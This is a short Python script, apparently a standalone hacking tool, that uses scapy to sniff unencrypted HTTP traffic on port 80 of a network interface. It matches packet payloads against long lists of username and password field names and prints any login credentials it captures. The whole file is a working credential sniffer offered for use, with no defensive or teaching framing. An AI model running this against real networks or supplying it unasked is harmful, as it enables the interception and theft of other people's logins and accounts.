from scapy.all import *
from urllib import parse
import re

# Interface to sniff on
iface = "eth0"

# Username and password field candidates
userfields = [
    'log', 'login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', 'user_name',
    'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname',
    'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename',
    'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username',
    'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in', 'usuario'
]

passfields = [
    'ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword',
    'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword',
    'passwort', 'passwrd', 'wppassword', 'upasswd', 'senha', 'contrasena'
]

# Extract login credentials from HTTP payload
def get_login_pass(body):
    user = None
    passwd = None

    for login in userfields:
        login_re = re.search(rf'({login}=[^&]+)', body, re.IGNORECASE)
        if login_re:
            user = login_re.group()

    for passfield in passfields:
        pass_re = re.search(rf'({passfield}=[^&]+)', body, re.IGNORECASE)
        if pass_re:
            passwd = pass_re.group()

    if user and passwd:
        return (user, passwd)

# Packet parser callback
def pkt_parser(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
        # Filter for HTTP traffic only
        if packet[TCP].dport == 80 or packet[TCP].sport == 80:
            try:
                body = bytes(packet[TCP].payload).decode(errors="ignore")
                user_pass = get_login_pass(body)
                if user_pass:
                    print("\n[+] Potential Credentials Found:")
                    print("    →", parse.unquote(user_pass[0]))
                    print("    →", parse.unquote(user_pass[1]))
            except Exception as e:
                print(f"[!] Error decoding payload: {e}")

# Interface check and sniffer start
if __name__ == "__main__":
    try:
        if iface not in get_if_list():
            print(f"[!] Interface '{iface}' not found. Available interfaces: {get_if_list()}")
            exit(1)

        print(f"[+] Sniffing on interface: {iface}")
        sniff(iface=iface, prn=pkt_parser, store=0)
    except KeyboardInterrupt:
        print("\n[!] Exiting")
        exit(0)
